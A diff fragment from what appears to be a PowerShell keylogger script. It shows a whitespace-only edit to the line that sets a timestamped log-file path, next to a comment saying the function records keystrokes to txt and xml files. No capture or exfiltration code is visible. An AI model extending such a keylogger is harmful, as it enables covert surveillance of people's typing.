@@ -1,7 +1,7 @@
 # function records keystrokes both in txt and xml files.
 function KeyLogger()
 {
-	$Path="C:\Users\decoder\Desktop\KeyLogger $(get-date -UFormat "%m.%d.%Y.%H.%M.%S").txt"
+	$Path = "C:\Users\decoder\Desktop\KeyLogger $(get-date -UFormat "%m.%d.%Y.%H.%M.%S").txt"
 	$XML_Path = "C:\Users\decoder\Desktop\KeyLogger $(get-date -UFormat "%m.%d.%Y.%H.%M.%S").xml"
 	$first_time = 0
 
